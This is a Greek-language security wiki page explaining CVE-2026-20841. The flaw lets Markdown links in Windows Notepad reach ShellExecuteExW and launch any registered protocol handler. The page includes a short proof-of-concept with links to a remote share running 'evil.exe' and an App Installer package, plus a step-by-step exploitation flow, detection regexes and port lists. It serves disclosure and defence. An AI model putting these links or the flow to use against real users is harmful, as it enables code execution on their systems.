# Κατάχρηση Windows Protocol Handler / ShellExecute (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Οι εφαρμογές Windows που αποδίδουν Markdown ή HTML ενδέχεται να παραδίδουν τους στόχους στους οποίους γίνεται κλικ στη `ShellExecuteExW`. Επειδή η ShellExecute δρομολογεί καταχωρισμένα URI schemes και συσχετίσεις αρχείων, ένας renderer χρειάζεται ρητό allowlist και δεν πρέπει να θεωρεί ότι κάθε σύνδεσμος είναι HTTP(S). Η παρακάτω συμπεριφορά του Notepad περιγράφει το CVE-2026-20841 και δεν πρέπει να γενικεύεται σε όλους τους renderers.<sup>[[1]](#references)[[3]](#references)</sup>

## Επιφάνεια ShellExecuteExW στη λειτουργία Markdown του Windows Notepad
- Το Notepad επιλέγει τη λειτουργία Markdown **μόνο για επεκτάσεις `.md`**, μέσω μιας σύγκρισης σταθερής συμβολοσειράς στη `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Υποστηριζόμενοι σύνδεσμοι Markdown:
  - Τυπικός: `[text](target)`
  - Autolink: `<target>` (αποδίδεται ως `[target](target)`), επομένως και οι δύο συντακτικές μορφές έχουν σημασία για payloads και detections.
- Τα κλικ στους συνδέσμους υποβάλλονται σε επεξεργασία στη `sub_140170F60()`, η οποία εφαρμόζει ασθενή φιλτράρισμα και στη συνέχεια καλεί τη `ShellExecuteExW`.
- Η `ShellExecuteExW` δρομολογεί προς **οποιοδήποτε διαμορφωμένο protocol handler**, όχι μόνο προς HTTP(S).<sup>[[1]](#references)</sup>

### Σημεία που πρέπει να ληφθούν υπόψη για τα payloads
- Οποιεσδήποτε ακολουθίες `\\` στον σύνδεσμο **κανονικοποιούνται σε `\`** πριν από τη `ShellExecuteExW`, επηρεάζοντας τη δημιουργία και τον εντοπισμό UNC/path.
- Τα αρχεία `.md` **δεν συσχετίζονται από προεπιλογή με το Notepad**· το θύμα πρέπει και πάλι να ανοίξει το αρχείο στο Notepad και να κάνει κλικ στον σύνδεσμο, αλλά αφού αποδοθεί, ο σύνδεσμος είναι clickable.
- Επικίνδυνα schemes ως παραδείγματα:<sup>[[1]](#references)</sup>
  - `file://` για εκκίνηση τοπικού/UNC payload.
  - `ms-appinstaller://` για ενεργοποίηση ροών του App Installer. Άλλα schemes που είναι καταχωρισμένα τοπικά μπορεί επίσης να γίνουν αντικείμενο κατάχρησης.

### Ελάχιστο PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```

### Ροή εκμετάλλευσης
1. Δημιουργήστε ένα **αρχείο `.md`** ώστε το Notepad να το εμφανίζει ως Markdown.
2. Ενσωματώστε έναν σύνδεσμο με επικίνδυνο URI scheme (`file:`, `ms-appinstaller:` ή οποιονδήποτε εγκατεστημένο handler).
3. Παραδώστε το αρχείο (μέσω HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB ή παρόμοιου πρωτοκόλλου) και πείστε τον χρήστη να το ανοίξει στο Notepad.
4. Με το κλικ, ο **κανονικοποιημένος σύνδεσμος** παραδίδεται στο `ShellExecuteExW` και ο αντίστοιχος protocol handler εκτελεί το περιεχόμενο στο πλαίσιο του χρήστη.<sup>[[1]](#references)[[2]](#references)</sup>

## Ιδέες ανίχνευσης
- Παρακολουθήστε μεταφορές αρχείων `.md` μέσω θυρών/πρωτοκόλλων που χρησιμοποιούνται συχνά για την παράδοση εγγράφων: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Αναλύστε τους συνδέσμους Markdown (τυπικούς και autolink) και αναζητήστε `file:` ή `ms-appinstaller:` **χωρίς διάκριση πεζών-κεφαλαίων**.
- Regex που προτείνονται από προμηθευτές για τον εντοπισμό πρόσβασης σε απομακρυσμένους πόρους:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Η διόρθωση του vendor που περιγράφεται από το ZDI περιορίζει τους αποδεκτούς στόχους σε τοπικά αρχεία και HTTP(S). Επεκτείνετε τις detections και σε άλλους εγκατεστημένους protocol handlers, ανάλογα με τις ανάγκες, επειδή η καταχωρισμένη επιφάνεια επίθεσης διαφέρει ανά σύστημα.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Αυθαίρετη εκτέλεση κώδικα στο Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
